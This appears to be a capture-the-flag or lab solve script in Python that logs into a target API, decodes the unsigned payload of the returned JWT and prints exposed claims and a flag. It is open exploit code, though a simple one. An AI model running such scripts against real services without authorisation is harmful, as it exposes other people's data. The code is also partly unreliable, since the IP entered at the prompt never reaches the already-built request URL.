import requests
import json
import base64
import sys

# --- Configuration for Example 1: Sensitive Information Disclosure ---
TARGET_IP = "10.64.168.127"
AUTH_URL = f"http://{TARGET_IP}/api/v1.0/example1"
USERNAME = "user"
PASSWORD = "password1" 
# -------------------------------------------------------------------

def decode_base64_url(data):
    """
    Decodes a Base64URL string, automatically handling missing padding 
    (= characters) which are stripped from JWT segments.
    """
    # Calculate required padding
    padding = '=' * (4 - (len(data) % 4))
    # Decode Base64URL
    return base64.urlsafe_b64decode(data + padding).decode('utf-8')

def exploit_example1():
    print(f"[*] Exploit 1: Starting Sensitive Information Disclosure Attack (IP: {TARGET_IP})")
    
    # Step 1: Authenticate to retrieve the JWT token
    print(f"\n[1/3] Authenticating to {AUTH_URL}...")
    auth_data = json.dumps({"username": USERNAME, "password": PASSWORD})

    try:
        response = requests.post(
            AUTH_URL,
            data=auth_data,
            headers={'Content-Type': 'application/json'}
        )
        response.raise_for_status()
        data = response.json()
        
        if 'token' not in data:
            print("[-] Error: 'token' not found in response.")
            print(f"Response: {data}")
            return

        jwt_token = data['token']
        print(f"[+] JWT Token Retrieved: {jwt_token}")

    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed during authentication: {e}")
        return
    except json.JSONDecodeError:
        print(f"[-] Error: Failed to decode JSON response. Received: {response.text}")
        return

    # Step 2: Extract and decode the payload (the middle part)
    try:
        # JWT structure is Header.Payload.Signature
        parts = jwt_token.split('.')
        if len(parts) != 3:
            print("[-] Error: Invalid JWT format (expected 3 segments).")
            return
            
        payload_b64 = parts[1]
        print(f"\n[2/3] Decoding JWT Payload segment: {payload_b64}")
        
        decoded_payload_str = decode_base64_url(payload_b64)
        
        # Parse the decoded string back into a JSON object for cleaner output
        decoded_payload = json.loads(decoded_payload_str)
        
    except Exception as e:
        print(f"[-] Error during decoding or JSON parsing: {e}")
        return

    # Step 3: Display the sensitive claims (including the flag)
    print("\n[3/3] Displaying Decoded Payload and Flag:")
    print("-" * 50)
    print("Decoded Claims (Sensitive Info Exposed):")
    # Use json.dumps to print the object neatly
    print(json.dumps(decoded_payload, indent=4))
    print("-" * 50)
    
    if 'flag' in decoded_payload:
        print(f"[+] FLAG RECOVERED: {decoded_payload['flag']}")
    else:
        print("[i] The 'flag' claim was not explicitly found in the payload.")


if __name__ == "__main__":
    
    print("--- JWT Sensitive Information Disclosure Exploiter (Example 1) ---")
    
    # Allow user to specify IP, default to 10.64.168.127
    ip_input = input(f"Enter the target IP address (default: {TARGET_IP}): ").strip()
    if ip_input:
        TARGET_IP = ip_input
        
    exploit_example1()